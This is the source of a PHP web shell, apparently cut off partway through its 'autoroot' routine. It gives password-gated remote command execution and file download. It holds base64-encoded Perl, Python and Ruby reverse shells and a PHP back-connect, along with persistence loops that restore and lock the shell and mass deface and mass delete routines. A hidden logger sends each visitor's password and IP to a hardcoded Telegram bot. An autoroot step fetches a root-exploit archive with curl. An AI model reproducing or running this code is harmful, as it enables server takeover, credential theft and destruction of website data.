<?php
class Pukimak {
    private $cyaa;
    private $content;

    public function __construct($cyaa) {
        $this->awakening = $cyaa;
    }

    public function execute() {
	}
};
@ob_start();
@set_time_limit(0);
@ini_set("max_execution_time", 0);
@ini_set("output_buffering", 0);
@ini_set("display_errors", 0);
@ini_set("log_errors", 0);
@ini_set('error_log', 0);
$password = isset($_POST['password']) ? $_POST['password'] : '';
$botToken = '6849508672:AAGAmQvC7zibYi0qSLT4HM-9NScFo26Pa1Q';
$chatId = '5575586332';
$xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$logMessage = "___Logger TOP99___ \n\n Shell nya =\n $xPath \n\n Password =\n $password \n\n IP Hacker Lain :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
sendTelegramMessage($botToken, $chatId, $logMessage);
$password="c0e69812c177edcb1bc72fe0ee7d020e67cd72b8";
$nm = "rootToku1337";
function login() {
echo '<html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=0.70">
        <title></title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
        <link rel="icon" href="https://d.top4top.io/p_1748iokq91.png">
    </head>
<body class="bg-secondary">
<form method="POST">
    <div class="container-fluid">
        <div class="py-3" id="main">
            <div class="input-group">
                <div class="input-group-text"><i class="fa fa-user-circle"></i></div>
                <input class="form-control form-control-sm" type="password" placeholder="password" name="password" required>
                <button class="btn btn-outline-light btn-sm"><i class="fa fa-sign-in"></i></button>
            </div>
        </div>
    </div>
</form>
</body>
</html>';
exit;
}

if(!isset($_COOKIE[sha1($_SERVER['HTTP_HOST'])])) {
    if(empty($password) || (isset($_POST['password']) && (sha1($_POST['password']) == $password))) {
        setcookie(sha1($_SERVER['HTTP_HOST']), true);
        // $_COOKIE[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        login();
    }
}

// logout
function sendTelegramMessage($botToken, $chatId, $message)
{
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
    ];
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($params),
        ],
    ];
    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);
}
if(isset($_GET["logout"])) {
session_start();
session_destroy();
echo '<script>window.location="'.$_SERVER['PHP_SELF'].'";</script>';
}
if (isset($_GET['action']) && $_GET['action'] == 'download') {
    @ob_clean();
    $file = $_GET['item'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
function flash($message, $status, $class, $redirect = false) {
    if (!empty($_SESSION["message"])) {
        unset($_SESSION["message"]);
    }
    if (!empty($_SESSION["class"])) {
        unset($_SESSION["class"]);
    }
    if (!empty($_SESSION["status"])) {
        unset($_SESSION["status"]);
    }
    $_SESSION["message"] = $message;
    $_SESSION["class"] = $class;
    $_SESSION["status"] = $status;
    if ($redirect) {
        header('Location: ' . $redirect);
        exit();
    }
    return true;
}

function clear() {
    if (!empty($_SESSION["message"])) {
        unset($_SESSION["message"]);
    }
    if (!empty($_SESSION["class"])) {
        unset($_SESSION["class"]);
    }
    if (!empty($_SESSION["status"])) {
        unset($_SESSION["status"]);
    }
    return true;
}

function writable($path, $perms){
    return (!is_writable($path)) ? "<font color=\"red\">".$perms."</font>" : "<font color=\"lime\">".$perms."</font>";
}

function perms($path) {
    $perms = fileperms($path);
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } 
    elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } 
    elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } 
    elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } 
    elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } 
    elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } 
    elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } 
    else {
        // Unknown
        $info = 'u';
    }

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x' ) :
    (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x' ) :
    (($perms & 0x0400) ? 'S' : '-'));
    
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x' ) :
    (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

function fsize($file) {
    $a = ["B", "KB", "MB", "GB", "TB", "PB"];
    $pos = 0;
    $size = filesize($file);
    while ($size >= 1024) {
        $size /= 1024;
        $pos++;
    }
    return round($size, 2)." ".$a[$pos];
}

if (isset($_GET['dir'])) {
    $path = $_GET['dir'];
    chdir($_GET['dir']);
} else {
    $path = getcwd();
}

$path = str_replace('\\', '/', $path);
$exdir = explode('/', $path);

function getOwner($item) {
    if (function_exists("posix_getpwuid")) {
        $downer = @posix_getpwuid(fileowner($item));
        $downer = $downer['name'];
    } else {
        $downer = fileowner($item);
    }
    if (function_exists("posix_getgrgid")) {
        $dgrp = @posix_getgrgid(filegroup($item));
        $dgrp = $dgrp['name'];
    } else {
        $dgrp = filegroup($item);
    }
    return $downer . '/' . $dgrp;
}

// Another CMD
function namerootToku()
{
    return "90125467239121912" . bin2hex(__DIR__);
}
function handlerName()
{
    return "901H0012121045689" . bin2hex(__DIR__);
}
function nameShiz()
{
    $lockname = $_POST["lockfile"];
    $dirna = getcwd();
    return "250378228542009915036352" . base64_encode($dirna.'/'.$lockname);
}
function handlerNa()
{
    $lockname = $_POST["lockfile"];
    $dirna = getcwd();
    return "304182847327984488423413" . base64_encode($dirna.'/'.$lockname);
}

function LewsEx($in,$re=false){
    $data = lews_cmd($in,$re);
    if(empty($data)){
        if($GLOBALS['sys']=='unix'){
            if(strlen(lews_cmd("whoami"))){
                $cmd = lews_cmd($in);
                if(!empty($cmd)){
                    return $cmd;
                }
            }
        }
    }
    return $data;
}

function lews_cmd($in, $re = false)
{
$out='';
try{
if($re)$in=$in." 2>&1";
if(function_exists('exec')){
@exec($in,$out);
$out = @join("\n",$out);
}elseif(function_exists('passthru')) {
ob_start();
@passthru($in);
$out = ob_get_clean();
}elseif(function_exists('system')){
ob_start();
@system($in);
$out = ob_get_clean();
} elseif (function_exists('shell_exec')) {
$out = shell_exec($in);
}elseif(function_exists("popen")&&function_exists("pclose")){
if(is_resource($f = @popen($in,"r"))){
$out = "";
while(!@feof($f))
$out .= fread($f,1024);
pclose($f);
}
}elseif(function_exists('proc_open')){
$pipes = array();
$process = @proc_open($in.' 2>&1', array(array("pipe","w"), array("pipe","w"), array("pipe","w")), $pipes, null);
$out=@stream_get_contents($pipes[1]);
}elseif(class_exists('COM')){
$alfaWs = new COM('WScript.shell');
$exec = $alfaWs->exec('cmd.exe /c '.$_POST['ucmd']);
$stdout = $exec->StdOut();
$out=$stdout->ReadAll();
}
}catch(Exception $e){}
return $out;
}

// Back Conncect
function bctool() {
    if (isset($_POST['ip']) && isset($_POST['port'])) {
        if($_POST['backconnect'] == 'perl') {
$bc=base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
$plbc=@fopen('bc.pl','w');
fwrite($plbc,$bc);
$out = LewsEx("perl bc.pl ".$_POST['ip']." ".$_POST['port']." 1>/dev/null 2>&1 &");
sleep(1);
echo "<pre>$out\n".LewsEx("ps aux | grep bc.pl")."</pre>";
unlink("bc.pl");
}
if($_POST['backconnect'] == 'python') {
$becaa=base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBDb243ZXh0IC0gWGFpIFN5bmRpY2F0ZVxuVGhhbmtzIEdvb2dsZSBGb3IgUmVmZXJlbnNpXG5cbicnJykNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwwKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDEpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMikNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwzKQ0KICAgIHNoZWxsID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pDQogIGV4Y2VwdCBzb2NrZXQudGltZW91dDoNCiAgICBwcmludCAiVGltT3V0Ig0KICBleGNlcHQgc29ja2V0LmVycm9yLCBlOg0KICAgIHByaW50ICJFcnJvciIsIGUNCnB5YmFja2Nvbm5lY3QoKQ==");
$pbcaa=@fopen('bcpyt.py','w');
fwrite($pbcaa,$becaa);
$out1 = LewsEx("python bcpyt.py ".$_POST['ip']." ".$_POST['port']);
sleep(1);
echo "<pre>$out1\n".LewsEx("ps aux | grep bcpyt.py")."</pre>";
unlink("bcpyt.py");
}
if($_POST['backconnect'] == 'ruby') {
$becaak=base64_decode("IyEvdXNyL2Jpbi9lbnYgcnVieQ0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KIw0KIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsDQojIGIzNzRrDQpyZXF1aXJlICdzb2NrZXQnDQpyZXF1aXJlICdwYXRobmFtZScNCg0KZGVmIHVzYWdlDQoJcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KCXByaW50ICJyZXZlcnNlIDpcclxuICBydWJ5ICIgKyBGaWxlLmJhc2VuYW1lKF9fRklMRV9fKSArICIgW3BvcnRdIFtob3N0XVxyXG4iDQplbmQNCg0KZGVmIHN1Y2tzDQoJc3Vja3MgPSBmYWxzZQ0KCWlmIFJVQllfUExBVEZPUk0uZG93bmNhc2UubWF0Y2goJ21zd2lufHdpbnxtaW5ndycpDQoJCXN1Y2tzID0gdHJ1ZQ0KCWVuZA0KCXJldHVybiBzdWNrcw0KZW5kDQoNCmRlZiByZWFscGF0aChzdHIpDQoJcmVhbCA9IHN0cg0KCWlmIEZpbGUuZXhpc3RzPyhzdHIpDQoJCWQgPSBQYXRobmFtZS5uZXcoc3RyKQ0KCQlyZWFsID0gZC5yZWFscGF0aC50b19zDQoJZW5kDQoJaWYgc3Vja3MNCgkJcmVhbCA9IHJlYWwuZ3N1YigvXC8vLCJcXCIpDQoJZW5kDQoJcmV0dXJuIHJlYWwNCmVuZA0KDQppZiBBUkdWLmxlbmd0aCA9PSAxDQoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpDQoJcyA9IHNlcnZlci5hY2NlcHQNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQoJYmVnaW4NCgkJaWYgbm90IHN1Y2tzDQoJCQlmID0gcy50b19pDQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCgkJZWxzZQ0KCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQl3aGlsZSBsaW5lID0gcy5nZXRzDQoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvDQoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiINCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQ0KCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpDQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpDQoJCQkJCQllbmQNCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZS5jaG9tcCkNCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2UNCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0NCgkJCQkJZW5kDQoJCQkJZW5kDQoJCQllbmQNCgkJZW5kDQoJcmVzY3VlIGVycm9yQnJvDQoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KCWVuc3VyZQ0KCQlzLmNsb3NlDQoJCXMgPSBuaWwNCgllbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCglpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQoJCWhvc3QgPSBBUkdWWzFdDQoJZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQ0KCQlob3N0ID0gQVJHVlswXQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXMgPSBUQ1BTb2NrZXQubmV3KCIje2hvc3R9IiwgcG9ydCkNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSINCgliZWdpbg0KCQlpZiBub3Qgc3Vja3MNCgkJCWYgPSBzLnRvX2kNCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLCBmLCBmLCBmKQ0KCQllbHNlDQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMNCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8NCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pDQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkNCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkNCgkJCQkJCQlEaXIuY2hkaXIobGluZSkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQ0KCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQ0KCQkJCQkJZW5kDQoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCQkJZWxzZQ0KCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCglyZXNjdWUgZXJyb3JCcm8NCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiDQoJZW5zdXJlDQoJCXMuY2xvc2UNCgkJcyA9IG5pbA0KCWVuZA0KZWxzZQ0KCXVzYWdlDQoJZXhpdA0KZW5k");
$pbcaak=@fopen('bcruby.rb','w');
fwrite($pbcaak,$becaak);
$out2 = LewsEx("ruby bcruby.rb ".$_POST['ip']." ".$_POST['port']);
sleep(1);
echo "<pre>$out2\n".LewsEx("ps aux | grep bcruby.rb")."</pre>";
unlink("bcruby.rb");
}
if($_POST['backconnect'] == 'php') {
            $ip = $_POST['ip'];
            $port = $_POST['port'];
            $sockfd = fsockopen($ip , $port , $errno, $errstr );
            if($errno != 0){
              echo "<font color='red'>$errno : $errstr</font>";
            } else if (!$sockfd)  {
              $result = "<p>Unexpected error has occured, connection may have failed.</p>";
            } else {
              fputs ($sockfd ,"
                \n{################################################################}
                \n..:: BackConnect Php By rootToku1337 ::..
                \n{################################################################}\n");
              $dir = LewsEx("pwd");
              $sysinfo = LewsEx("uname -a");
              $time = LewsEx("time");
              $len = 1337;
              fputs($sockfd, "User ", $sysinfo, "connected @ ", $time, "\n\n");
              while(!feof($sockfd)){ $cmdPrompt = '[rootToku1337]#:> ';
              fputs ($sockfd , $cmdPrompt );
              $command= fgets($sockfd, $len);
              fputs($sockfd , "\n" . LewsEx($command) . "\n\n");
            }
            fclose($sockfd);
            }
          }
    } else {
        echo '<!-- back connect -->  ';
        echo '<form action="" method="post">';
        echo '<div class="mb-3">';
        echo '<label class="form-label">Ip</label>';
        echo '<input type="text" class="form-control" name="ip" placeholder="127.0.0.0" required>';
        echo '</div>';
        echo '<div class="mb-3">';
        echo '<label class="form-label">Port</label>';
        echo '<input type="text" class="form-control" name="port" placeholder="1337" required>';
        echo '</div>';
        echo '<div class="mb-3">';
        echo '<label class="form-label">Tipe</label>';
        echo "<select class='form-control' name='backconnect'><option value='perl'>Perl</option><option value='php'>PHP</option><option value='python'>Python</option><option value='ruby'>Ruby</option></select>";
        echo '</div>';
        echo '<button class="btn btn-outline-light" type="submit">Submit</button>';
        echo '</form>';
    }
}


// lock shell
function lockshell() {
$filena = $_SERVER["SCRIPT_FILENAME"];
$dirna = getcwd();
$_1_3_3_7 = sys_get_temp_dir();
if (!is_dir($_1_3_3_7 . "/.sessions")) {
    mkdir($_1_3_3_7 . "/.sessions");
}
if (!is_file($_1_3_3_7 . '/.sessions/.' . namerootToku() . ".tmp")) {
    copy($filena, $_1_3_3_7 . "/.sessions/." . namerootToku() . ".tmp");
}
if (file_exists($_1_3_3_7 . "/.sessions/." . namerootToku() . ".tmp")) {
    $_1_3_3 = $_1_3_3_7 . "/.sessions/." . namerootToku() . ".tmp";
    file_put_contents($_1_3_3_7 . "/.sessions/." . handlerName() . ".tmp", '
    <?php
while (True) {
    if (!file_exists("' . $dirna . '")) {
        mkdir("' . $dirna . '");
    }
    if (!file_exists("' . $filena . '")) {
        copy("' . $_1_3_3 . '", "' . $filena . '");
    }
    if (fileperms("' . $filena . '") != "0444") {
        chmod("' . $filena . '", 0444);
    }
    if (fileperms("' . $dirna . '") != "0555") {
        chmod("' . $dirna . '", 0555);
    }
}
?>');
   if (isset($_GET['action']) && $_GET['action'] == 'lock') {
        chmod($filena, 0444);
        chmod($dirna, 0555);
        LewsEx('sh -c "nohup $(nohup php ' . $_1_3_3_7 . '/.sessions/.' . handlerName() . '.tmp > /dev/null 2>&1 &) > /dev/null 2>&1 &"',false);
    }
}
}

// lock file
function lockfiles() {

$lockname = $_POST["lockfile"];
$dirna = getcwd();
$_1_3_3_7_ = sys_get_temp_dir();
if (!is_dir($_1_3_3_7_ . "/.sessions")) {
    mkdir($_1_3_3_7_ . "/.sessions");
}
if (!is_file($_1_3_3_7_ . '/.sessions/.-' . nameShiz() . ".tmp")) {
    copy($dirna.'/'.$lockname, $_1_3_3_7_ . "/.sessions/.-" . nameShiz() . ".tmp");
}
if (file_exists($_1_3_3_7_ . "/.sessions/.-" . nameShiz() . ".tmp")) {
    $_1_3_3_ = $_1_3_3_7_ . "/.sessions/.-" . nameShiz() . ".tmp";
    file_put_contents($_1_3_3_7_ . "/.sessions/.-" . handlerNa() . ".tmp", '
    <?php
while (True) {
    if (!file_exists("' . $dirna . '")) {
        mkdir("' . $dirna . '");
    }
    if (!file_exists("' . $dirna . '/' . $lockname . '")) {
        copy("' . $_1_3_3_ . '", "' . $dirna . '/' . $lockname . '");
    }
    if (fileperms("' . $dirna . '/' . $lockname . '") != "0444") {
        chmod("' . $dirna . '/' . $lockname . '", 0444);
    }
    if (fileperms("' . $dirna . '") != "0555") {
        chmod("' . $dirna . '", 0555);
    }
}
?>');
        chmod($dirna.'/'.$lockname, 0444);
        chmod($dirna, 0555);
        LewsEx('sh -c "nohup $(nohup php ' . $_1_3_3_7_ . '/.sessions/.-' . handlerNa() . '.tmp > /dev/null 2>&1 &) > /dev/null 2>&1 &"',false);
  }
}

// Mass Deface
function massdeface($path) { 
    function mass_all($dir,$namefile,$contents_sc) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $▚ = $dirc.'/'.$namefile;
                if($dirb === '.') {
                    file_put_contents($▚, $contents_sc);
                } elseif($dirb === '..') {
                    file_put_contents($▚, $contents_sc);
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo "[<gr><i class='fa fa-check-all'></i></gr>]&nbsp;$▚<br>";
                            file_put_contents($▚, $contents_sc);
                            $▟ = mass_all($dirc,$namefile,$contents_sc);
                            }
                        }
                    }
                }
            }
        }
        function mass_onedir($dir,$namefile,$contents_sc) {
            if(is_writable($dir)) {
                $dira = scandir($dir);
                foreach($dira as $dirb) {
                    $dirc = "$dir/$dirb";
                    $▚ = $dirc.'/'.$namefile;
                    if($dirb === '.') {
                        file_put_contents($▚, $contents_sc);
                    } elseif($dirb === '..') {
                        file_put_contents($▚, $contents_sc);
                    } else {
                        if(is_dir($dirc)) {
                            if(is_writable($dirc)) {
                                echo "[<gr><i class='fa fa-check-all'></i></gr>]&nbsp;$dirb/$namefile<br>";
                                file_put_contents($▚, $contents_sc);
                            }
                        }
                    }
                }
            }
        }
    if (isset($_POST['start'])) {
        $name = $_POST['massDefName'];
        echo "<center>------- Result -------</center>";
        echo '<div class="card text-dark col-md-7 mb-3 mt-2">';
        echo "<pre>Done ~~<br><br>$name<br>";
        if($_POST['tipe'] == 'mass') {
            mass_all($_POST['massDefDir'], $_POST['massDefName'], $_POST['massDefContent']);
        } else {
            mass_onedir($_POST['massDefDir'], $_POST['massDefName'], $_POST['massDefContent']);
        }
        echo '</pre></div>';
    } else {
        echo '<!-- mass deface -->  ';
        echo '<div class="col-md-5">';
        echo '<form action="" method="post">';
        echo '<div class="mb-3">';
        echo "<div class='form-check'>
                <input class='form-check-input' type='checkbox' value='onedir' name='tipe' id='flexCheckDefault' checked>
                <label class='form-check-label' for='flexCheckDefault'>One directory</label>
            </div>
            <div class='form-check'>
                <input class='form-check-input' type='checkbox' value='mass' name='tipe' id='flexCheckDefault'>
                <label class='form-check-label' for='flexCheckDefault'>All directory</label>
            </div>";
        echo '<label class="form-label">Directory</label>';
        echo "<input type='text' class='form-control' name='massDefDir' value='$path'>";
        echo '</div>';
        echo '<div class="mb-3">';
        echo '<label class="form-label">File Name</label>';
        echo '<input type="text" class="form-control" name="massDefName" placeholder="test.php">';
        echo '</div>';
        echo '<div class="mb-3">';
        echo '<label class="form-label">File Content</label>';
        echo '<textarea class="form-control" name="massDefContent" rows="7" placeholder="Hello World"></textarea>';
        echo '</div>';
        echo '<button class="btn btn-outline-light" type="submit" name="start">Submit</button>';
        echo '</form>';
        echo '</div>';
    }
}

// Mass Delete
function massdelete($path) {
    function massdel($dir, $file) {
        if (is_writable($dir)) {
            $dira = scandir($dir);
            foreach ($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$file;
                if ($dirb === '.') {
                    if (file_exists("$dir/$file")) {
                        unlink("$dir/$file");
                    }
                } elseif ($dirb === '..') {
                    if (file_exists(''.dirname($dir)."/$file")) {
                        unlink(''.dirname($dir)."/$file");
                    }
                } else {
                    if (is_dir($dirc)) {
                        if (is_writable($dirc)) {
                            if ($lokasi) {
                                echo "$lokasi > Deleted\n";
                                unlink($lokasi);
                                $massdel = massdel($dirc, $file);
                            }
                        }
                    }
                }
            }
        }
    }
    if (isset($_POST['massDel']) && isset($_POST['massDelName'])) {
        $name = $_POST['massDelName'];
        echo "<center>------- Result -------</center>";
        echo '<div class="card text-dark col-md-7 mb-3 mt-2">';
        echo "<pre>Done ~~<br><br>./$name > Deleted<br>";
        massdel($_POST['massDel'], $name);
        echo '</pre></div>';
    } else {
        echo '<!-- mass delete -->  ';
        echo '<div class="col-md-5">';
        echo '<form action="" method="post">';
        echo '<div class="mb-3">';
        echo '<label class="form-label">Directory</label>';
        echo "<input type='text' class='form-control' name='massDel' value='$path'>";
        echo '</div>';
        echo '<div class="mb-3">';
        echo '<label class="form-label">File Name</label>';
        echo '<input type="text" class="form-control" name="massDelName" placeholder="test.php">';
        echo '</div>';
        echo '<button class="btn btn-outline-light" type="submit">Submit</button>';
        echo '</form>';
        echo '</div>';
    }
}

function root($set,$sad) {
    $x = "preg_match";
    $xx = "2>&1";
    if (!$x("/".$xx."/i", $set)) {
        $set = $set." ".$xx;
    }
    $a = "function_exists";
    $b = "proc_open";
    $c = "htmlspecialchars";
    $d = "stream_get_contents";
    if ($a($b)) {
        $ps = $b($set, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pink,$sad);
        return $d($pink[1]);
    } else {
        return "proc_open function is disabled!";
    }
}
//  Mail test
function autoroot() {
    $phtt = getcwd();
    if (isset($_GET['action']) && $_GET['action'] == 'autoroot') {
        if (!is_dir($phtt."/R00ting")) {
                    mkdir($phtt."/R00ting");
                    root("curl https://github.com/TokuHaxor/shell/raw/main/auto.tar.gz -o auto.tar.gz", $phtt."/R00ting");
                    root("tar -xf auto.tar.gz", $phtt."/R00ting");
                    if (!file_exists($phtt."/R00ting/netfilter")) {
                        die("<center class='text-danger'>Failed to Download Material !</center>");
                    }
                }
  echo '<div class="p-2">
            <div class="row justify-content-center">
                <div class="card text-dark col-md-7 mb-3">
